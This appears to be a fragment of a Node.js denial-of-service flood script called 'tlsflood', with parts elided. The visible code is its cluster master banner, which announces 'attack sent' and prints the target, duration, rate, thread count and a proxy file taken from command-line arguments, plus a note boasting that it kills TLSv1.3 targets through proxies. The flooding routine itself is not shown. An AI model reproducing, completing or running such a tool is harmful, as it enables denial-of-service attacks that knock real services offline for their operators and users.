...
const RESTART_DELAY = 1000;
 ...
 if (cluster.isMaster) {
  console.clear()
console.log(`Update: 01/03/2025`);
console.log(`status: tlsflood - attack sent`);
console.log(`--------------------------------------------`);
console.log(` target:    ` + process.argv[2]);
console.log(` time:      ` + process.argv[3]);
console.log(` rate:      ` + process.argv[4]);
console.log(` thread:    ` + process.argv[5]);
console.log(` froxyfile: ` + process.argv[6]);
console.log(`--------------------------------------------`);
console.log(`Note: TLSv1.3 killer big hard target ben proxy`);
console.log(`--------------------------------------------`);
